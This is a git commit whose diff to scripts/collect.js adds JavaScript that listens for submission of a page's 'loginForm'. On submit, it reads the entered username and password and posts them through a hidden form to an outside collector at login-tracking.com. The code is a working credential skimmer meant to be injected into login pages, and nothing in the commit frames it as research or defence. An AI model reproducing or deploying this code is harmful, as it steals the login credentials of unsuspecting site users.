dcd84c16adb2df6fb6a558ada4067238a017a9dc
thebigr <nevoroy@gmail.com>
2019-07-23 23:03:43 +0300

    eventListener works.

--- scripts/collect.js
+++ scripts/collect.js
@@ -1,26 +1,28 @@
-alert("I am an alert box!");
 
-post('http://login-tracking.com/collectorApi', {name: 'maayaaaaa'});
+var ele = document.getElementById('loginForm');
+if (!ele.addEventListener) {
+    ele.attachEvent('onsubmit', post('http://login-tracking.com/collectorApi',
+        {name: ele.name.value, password: ele.password.value}));            //Old IE
+    } else {
+    ele.addEventListener("submit", function () {
+        post('http://login-tracking.com/collectorApi',
+            {name: ele.name.value, password: ele.password.value})
+    }, false);  //Modern browsers
+}
 
 function post(path, params, method='post') {
-
-    // The rest of this code assumes you are not using a library.
-    // It can be made less wordy if you use one.
     const form = document.createElement('form');
     form.method = method;
     form.action = path;
-
     for (const key in params) {
         if (params.hasOwnProperty(key)) {
             const hiddenField = document.createElement('input');
             hiddenField.type = 'hidden';
             hiddenField.name = key;
             hiddenField.value = params[key];
-
             form.appendChild(hiddenField);
         }
     }
-
     document.body.appendChild(form);
     form.submit();
 }
